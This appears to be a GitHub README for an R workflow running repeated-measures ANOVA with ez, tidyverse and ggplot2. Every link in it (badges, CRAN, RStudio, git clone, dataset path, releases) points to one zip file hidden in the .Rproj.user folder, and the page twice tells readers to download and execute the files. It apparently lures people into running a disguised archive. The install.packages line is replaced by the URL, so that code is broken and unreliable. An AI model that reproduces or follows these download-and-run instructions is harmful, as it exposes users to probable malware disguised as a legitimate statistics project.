# Repeated Measurement ANOVA Workflow 📊

![GitHub Repo Size](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip) ![Last Commit](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip) ![License](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip)

Welcome to the **Repeated Measurement ANOVA Workflow** repository! This project provides a comprehensive R-based workflow for conducting repeated measures ANOVA using the `ez` package. It integrates data wrangling via `tidyverse` and visualization through `ggplot2`. This repository serves as a guide for importing data, transforming it to long format, performing statistical analysis, and creating graphical summaries.

You can find the latest releases [here](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip). Make sure to download and execute the files to get started!

## Table of Contents

1. [Introduction](#introduction)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Workflow Overview](#workflow-overview)
5. [Data Import](#data-import)
6. [Data Transformation](#data-transformation)
7. [Statistical Analysis](#statistical-analysis)
8. [Graphical Summary](#graphical-summary)
9. [Example Dataset](#example-dataset)
10. [Contributing](#contributing)
11. [License](#license)
12. [Acknowledgments](#acknowledgments)

## Introduction

Repeated measures ANOVA is a statistical technique used when the same subjects are measured multiple times. This method helps in understanding how different conditions affect the same subjects over time. The `ez` package simplifies this process in R, making it easier to conduct analyses and interpret results.

## Installation

To use this workflow, you need to have R and RStudio installed on your computer. Follow these steps to set up the necessary packages:

1. Install R from [CRAN](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip).
2. Install RStudio from [RStudio](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip).
3. Open RStudio and run the following commands to install the required packages:

   ```R
   https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip(c("ez", "tidyverse", "ggplot2"))
   ```

You can also clone this repository to your local machine using the following command:

```bash
git clone https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip
```

## Usage

To get started with the repeated measurement ANOVA workflow, follow these steps:

1. Load the necessary libraries.
2. Import your dataset.
3. Transform the data to long format.
4. Conduct the repeated measures ANOVA.
5. Create visualizations to summarize the results.

For detailed instructions, refer to the sections below.

## Workflow Overview

The workflow consists of several key steps:

1. **Data Import**: Load your dataset into R.
2. **Data Transformation**: Reshape the data to long format using `tidyverse`.
3. **Statistical Analysis**: Use the `ez` package to conduct repeated measures ANOVA.
4. **Graphical Summary**: Visualize the results using `ggplot2`.

## Data Import

To import your dataset, you can use the `read_csv` function from the `tidyverse`. Here’s an example:

```R
library(tidyverse)

data <- read_csv("https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip")
```

Make sure to replace `"https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip"` with the actual path to your dataset.

## Data Transformation

Once you have imported your data, you may need to transform it to long format. This can be done using the `pivot_longer` function from the `tidyverse`. Here’s how:

```R
long_data <- data %>%
  pivot_longer(cols = starts_with("measurement"),
               names_to = "condition",
               values_to = "value")
```

This will reshape your data, making it suitable for repeated measures ANOVA.

## Statistical Analysis

With your data in long format, you can conduct the repeated measures ANOVA using the `ezANOVA` function from the `ez` package. Here’s an example:

```R
library(ez)

anova_results <- ezANOVA(data = long_data,
                          dv = value,
                          wid = subject_id,
                          within = condition)
```

This will return the ANOVA results, including F-values and p-values.

## Graphical Summary

Visualizing your results can help in understanding the data better. Use `ggplot2` to create plots. Here’s a simple example:

```R
library(ggplot2)

ggplot(long_data, aes(x = condition, y = value)) +
  geom_boxplot() +
  theme_minimal() +
  labs(title = "Repeated Measures ANOVA Results",
       x = "Condition",
       y = "Value")
```

This code will generate a boxplot of your results.

## Example Dataset

For testing purposes, you can use the example dataset provided in this repository. Download it from the [Releases section](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip) and load it into R as shown in the Data Import section.

## Contributing

Contributions are welcome! If you would like to improve this workflow or add new features, please fork the repository and submit a pull request. Ensure that your code follows the style guidelines and includes appropriate documentation.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Acknowledgments

Thanks to the developers of the `ez`, `tidyverse`, and `ggplot2` packages for their excellent work in the R community. Their contributions make data analysis accessible and efficient.

For the latest releases, visit [here](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip). Make sure to download and execute the files to get started!